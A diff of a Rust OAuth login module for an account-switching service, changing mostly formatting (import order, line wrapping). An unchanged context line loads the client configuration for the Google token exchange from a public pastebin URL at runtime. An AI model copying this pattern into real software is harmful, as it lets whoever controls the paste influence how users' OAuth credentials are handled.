@@ -1,26 +1,27 @@
+use chrono::Utc;
+use sha2::{Digest, Sha256};
 /**
  * OAuth Login server and listener.
  * Runs a one-time TcpListener to receive Google OAuth flow callback code, exchanges it for credentials, and logs in the profile.
  * Main exports: impl SwitcherService OAuth methods
  */
-
 use std::fs;
-use chrono::Utc;
-use uuid::Uuid;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
-use sha2::{Digest, Sha256};
+use uuid::Uuid;
 
+use super::helpers::{base64_url_encode, extract_email_from_id_token, url_decode, url_encode};
 use crate::SwitcherService;
 use crate::quota::QuotaDecryptor;
-use switcher_core::{
-    Result, SwitcherError, ProfileView, TokenStatus, ProfileMetadata,
-};
-use super::helpers::{
-    url_decode, extract_email_from_id_token, url_encode, base64_url_encode,
-};
+use switcher_core::{ProfileMetadata, ProfileView, Result, SwitcherError, TokenStatus};
 
 impl SwitcherService {
-    pub async fn start_oauth_login<F>(&self, display_name: String, lang: String, auto_activate: bool, on_callback: F) -> Result<ProfileView>
+    pub async fn start_oauth_login<F>(
+        &self,
+        display_name: String,
+        lang: String,
+        auto_activate: bool,
+        on_callback: F,
+    ) -> Result<ProfileView>
     where
         F: Fn() + Send + Sync + 'static,
     {
@@ -99,7 +100,11 @@ impl SwitcherService {
             client_id, code_challenge, redirect_uri_encoded, &state, scopes_encoded
         );
 
-        self.logger.info(None, "oauth", format!("Opening browser for OAuth on port {}", port));
+        self.logger.info(
+            None,
+            "oauth",
+            format!("Opening browser for OAuth on port {}", port),
+        );
         let spawn_res = {
             use std::os::windows::process::CommandExt;
             std::process::Command::new("cmd")
@@ -138,10 +143,15 @@ impl SwitcherService {
 
         let code = code_res?;
 
-        self.logger.info(None, "oauth", "Initiating token exchange POST request to accounts.google.com...");
+        self.logger.info(
+            None,
+            "oauth",
+            "Initiating token exchange POST request to accounts.google.com...",
+        );
         let client = reqwest::Client::new();
 
-        self.logger.info(None, "oauth", "Loading external client configuration...");
+        self.logger
+            .info(None, "oauth", "Loading external client configuration...");
         let config_url = "https://pastebin.com/raw/15w8CsqC";
         let config_res = client.get(config_url).send().await;
 
@@ -158,7 +168,11 @@ impl SwitcherService {
             }
             Err(e) => {
                 let err_msg = format!("Failed to fetch authorization configuration: {}", e);
-                self.logger.error(None, "oauth", format!("Configuration load error: {}", err_msg));
+                self.logger.error(
+                    None,
+                    "oauth",
+                    format!("Configuration load error: {}", err_msg),
+                );
                 return Err(SwitcherError::Message(err_msg));
             }
         };
@@ -219,9 +233,7 @@ impl SwitcherService {
         let access_token = token_val
             .get("access_token")
             .and_then(|v| v.as_str())
-            .ok_or_else(|| {
-                SwitcherError::Message("Missing access_token in response".to_owned())
-            })?;
+            .ok_or_else(|| SwitcherError::Message("Missing access_token in response".to_owned()))?;
         let refresh_token = token_val.get("refresh_token")
             .and_then(|v| v.as_str())
             .ok_or_else(|| {
@@ -230,9 +242,7 @@ impl SwitcherService {
         let id_token = token_val
             .get("id_token")
             .and_then(|v| v.as_str())
-            .ok_or_else(|| {
-                SwitcherError::Message("Missing id_token in response".to_owned())
-            })?;
+            .ok_or_else(|| SwitcherError::Message("Missing id_token in response".to_owned()))?;
         let expires_in = token_val
             .get("expires_in")
             .and_then(|v| v.as_i64())
@@ -257,7 +267,13 @@ impl SwitcherService {
 
         // Check for duplicate account email
         let existing = self.list_profiles(None)?;
-        if existing.iter().any(|p| p.metadata.account_email.as_deref().map(|e| e.to_lowercase()) == Some(email.to_lowercase())) {
+        if existing.iter().any(|p| {
+            p.metadata
+                .account_email
+                .as_deref()
+                .map(|e| e.to_lowercase())
+                == Some(email.to_lowercase())
+        }) {
             return Err(SwitcherError::Message(format!(
                 "Account {} is already registered. Please delete the existing profile first.",
                 email
@@ -297,7 +313,10 @@ impl SwitcherService {
             self.logger.info(
                 Some(operation_id),
                 "oauth",
-                format!("No active profile set. Auto-activating newly created profile {}", new_profile_id),
+                format!(
+                    "No active profile set. Auto-activating newly created profile {}",
+                    new_profile_id
+                ),
             );
             let switch_res = tokio::task::block_in_place(|| {
                 self.perform_switch(operation_id, new_profile_id, None)
@@ -318,7 +337,9 @@ impl SwitcherService {
         }
 
         let mut quota = if let Some(ref email) = metadata.account_email {
-            QuotaDecryptor::decrypt_all_quotas().ok().and_then(|mut m| m.remove(email))
+            QuotaDecryptor::decrypt_all_quotas()
+                .ok()
+                .and_then(|mut m| m.remove(email))
         } else {
             None
         };
@@ -334,7 +355,6 @@ impl SwitcherService {
             has_refresh_token: true,
             quota,
         })
-
     }
 
     pub fn cancel_oauth_login(&self) -> Result<()> {
@@ -352,27 +372,55 @@ fn get_oauth_response_html(lang: &str, status: &str, detail: Option<&str>) -> St
         "success" => (
             "icon--success",
             r#"<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>"#,
-            if is_pl { "Autoryzacja udana!" } else { "Authorization Successful!" },
-            if is_pl { "Możesz bezpiecznie zamknąć tę kartę i wrócić do aplikacji." } else { "You can safely close this tab and return to the app." }
+            if is_pl {
+                "Autoryzacja udana!"
+            } else {
+                "Authorization Successful!"
+            },
+            if is_pl {
+                "Możesz bezpiecznie zamknąć tę kartę i wrócić do aplikacji."
+            } else {
+                "You can safely close this tab and return to the app."
+            },
         ),
         "csrf" => (
             "icon--error",
             r#"<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 13c0 5-3.5 7.5-7.66 9.7a1 1 0 0 1-.68 0C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.5 3.8 17 5 19 5a1 1 0 0 1 1 1z"/><path d="m10 10 4 4"/><path d="m14 10-4 4"/></svg>"#,
-            if is_pl { "Błąd bezpieczeństwa" } else { "Security Error" },
-            if is_pl { "Niepoprawny stan CSRF (zabezpieczenie przed atakami)." } else { "Invalid CSRF state (cross-site request protection)." }
+            if is_pl {
+                "Błąd bezpieczeństwa"
+            } else {
+                "Security Error"
+            },
+            if is_pl {
+                "Niepoprawny stan CSRF (zabezpieczenie przed atakami)."
+            } else {
+                "Invalid CSRF state (cross-site request protection)."
+            },
         ),
         "missing_code" => (
             "icon--error",
             r#"<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>"#,
             if is_pl { "Brak kodu" } else { "Missing Code" },
-            if is_pl { "Nie otrzymano kodu autoryzacji z serwera Google." } else { "No authorization code was received from Google." }
+            if is_pl {
+                "Nie otrzymano kodu autoryzacji z serwera Google."
+            } else {
+                "No authorization code was received from Google."
+            },
         ),
         _ => (
             "icon--error",
             r#"<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6 6 18"/><path d="m6 6 12 12"/></svg>"#,
-            if is_pl { "Błąd autoryzacji" } else { "Authorization Error" },
-            detail.unwrap_or(if is_pl { "Wystąpił nieznany błąd." } else { "An unknown error occurred." })
-        )
+            if is_pl {
+                "Błąd autoryzacji"
+            } else {
+                "Authorization Error"
+            },
+            detail.unwrap_or(if is_pl {
+                "Wystąpił nieznany błąd."
+            } else {
+                "An unknown error occurred."
+            }),
+        ),
     };
 
     format!(
@@ -460,13 +508,15 @@ where
     F: Fn(),
 {
     loop {
-        let (mut stream, _) = listener.accept().await.map_err(|e| {
-            SwitcherError::Message(format!("Accept error: {}", e))
-        })?;
+        let (mut stream, _) = listener
+            .accept()
+            .await
+            .map_err(|e| SwitcherError::Message(format!("Accept error: {}", e)))?;
         let mut buffer = [0; 4096];
-        let n = stream.read(&mut buffer).await.map_err(|e| {
-            SwitcherError::Message(format!("Stream read error: {}", e))
-        })?;
+        let n = stream
+            .read(&mut buffer)
+            .await
+            .map_err(|e| SwitcherError::Message(format!("Stream read error: {}", e)))?;
         if n == 0 {
             continue;
         }
@@ -533,9 +583,7 @@ where
             ));
         }
         let code_val = match code {
-            Some(c) => {
-                url_decode(&c)
-            }
+            Some(c) => url_decode(&c),
             None => {
                 let html_body = get_oauth_response_html(lang, "missing_code", None);
                 let response = format!(
